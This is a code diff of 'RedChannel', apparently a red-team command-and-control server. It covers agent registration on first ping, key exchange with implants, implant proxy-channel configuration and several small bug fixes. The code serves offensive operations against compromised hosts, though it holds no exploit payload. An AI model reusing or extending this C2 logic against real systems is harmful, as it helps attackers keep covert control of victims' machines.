@@ -79,7 +79,7 @@ export type RecvQMap = Map<DataId, DataChunk[]>;
 export type AgentModel = {
     id: string;
     secret: Buffer;
-    keyx?: ECKey;
+    pubkey?: ECKey;
     lastseen?: number;
     ip?: string;
     channel?: c2.AgentChannel;
@@ -134,6 +134,7 @@ export default class RedChannel {
         this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
         this.config = this.resetConfig(initialConfig ?? DefaultConfig);
+        this.resetLogLevel();
 
         if (!this.config.c2?.domain) {
             throw new Error("Please specify the c2 domain via cli or config file");
@@ -158,6 +159,16 @@ export default class RedChannel {
         this.initOperators();
 
         this.modules.proxy.proxyInit();
+    }
+
+    // checks the c2.debug value and resets the log even accordingly
+    resetLogLevel() {
+        if (this.config.c2?.debug) {
+            this.log.level = c2.LogLevel.DEBUG;
+            return;
+        }
+
+        this.log.level = c2.LogLevel.INFO;
     }
 
     // creates the operators object and hashes their passwords
@@ -195,7 +206,7 @@ export default class RedChannel {
         if (this.configFile) {
             let configInFile: c2.RedChannelConfig;
             try {
-                configInFile = JSON.parse(fs.readFileSync(this.configFile).toString()) as c2.RedChannelConfig;
+                configInFile = c2.RedChannelConfig.fromJsonString(fs.readFileSync(this.configFile).toString());
             } catch (ex) {
                 throw new Error(`error parsing config file: ${emsg(ex)}`);
             }
@@ -210,7 +221,7 @@ export default class RedChannel {
             this.agents.set(agentId, {
                 id: agentId,
                 secret: Buffer.from(""),
-                lastseen: Date.now() / 1000,
+                lastseen: Math.floor(Date.now() / 1000),
                 ip: ip,
                 channel: channel,
                 allowKeyx: false,
@@ -222,7 +233,7 @@ export default class RedChannel {
     }
 
     killAgent(agentId: string) {
-        if (this.agents.has(agentId)) throw new Error(`agent '${agentId}' does not exist`);
+        if (!this.agents.has(agentId)) throw new Error(`agent '${agentId}' does not exist`);
 
         this.agents.delete(agentId);
     }
@@ -348,9 +359,9 @@ export default class RedChannel {
         const configProto = implant.AgentConfig.create({});
         if (config.interval !== undefined) configProto.c2IntervalMs = { value: Number(config.interval) || this.config.implant?.interval || 5000 };
         if (config.throttleSendq !== undefined) configProto.throttleSendq = { value: Boolean(config.throttleSendq) };
-        if (config.proxyEnabled !== undefined) configProto.useWebChannel = { value: Boolean(config.proxyEnabled) };
-        if (config.proxyKey !== undefined) configProto.webKey = { value: config.proxyKey };
-        if (config.proxyUrl !== undefined) configProto.webUrl = { value: config.proxyUrl };
+        if (config.proxyEnabled !== undefined) configProto.useProxyChannel = { value: Boolean(config.proxyEnabled) };
+        if (config.proxyKey !== undefined) configProto.proxyKey = { value: config.proxyKey };
+        if (config.proxyUrl !== undefined) configProto.proxyUrl = { value: config.proxyUrl };
 
         const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
         // no need to send data, just the config proto
@@ -605,7 +616,8 @@ export default class RedChannel {
         }
 
         const agentId = segments.agentId;
-        if (!this.agents.has(agentId)) {
+        const agent = this.agents.get(agentId) as AgentModel;
+        if (!agent) {
             this.initAgent(agentId, channel, req.connection.remoteAddress);
             this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${c2.AgentChannel[channel]}`);
             const answers = this.processAgentFirstPing(agentId, hostname);
@@ -613,9 +625,7 @@ export default class RedChannel {
             return res.end();
         }
 
-        const agent = this.agents.get(agentId) as AgentModel;
-
-        agent.lastseen = Date.now() / 1000;
+        agent.lastseen = Math.floor(Date.now() / 1000);
         agent.ip = req.connection.remoteAddress;
 
         const dataId = segments.dataId;
@@ -834,7 +844,7 @@ export default class RedChannel {
 
                 try {
                     const agentPubkey = Buffer.from(data, "hex");
-                    agent.keyx = this.crypto.importUncompressedPublicKey(agentPubkey);
+                    agent.pubkey = this.crypto.importUncompressedPublicKey(agentPubkey);
                 } catch (ex) {
                     this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                     return [
@@ -846,10 +856,10 @@ export default class RedChannel {
                         },
                     ];
                 }
-                this.log.info(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
+                this.log.info(`agent(${agentId}) pubkey: ${agent.pubkey.asPublicECKey().toString("spki")}`);
 
                 try {
-                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
+                    agent.secret = this.crypto.deriveSecret(agent.pubkey, this.hashedPassword);
                 } catch (ex) {
                     this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                     return [
@@ -941,8 +951,8 @@ export default class RedChannel {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
-        if (!agent.keyx) throw new Error("missing keyx");
-        if (!agent.secret || agent.secret.length === 0) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);
+        if (!agent.pubkey) throw new Error("missing agent pubkey");
+        if (!agent.secret?.length) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);
 
         const dataBuffer = Buffer.from(data, "hex");
         const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
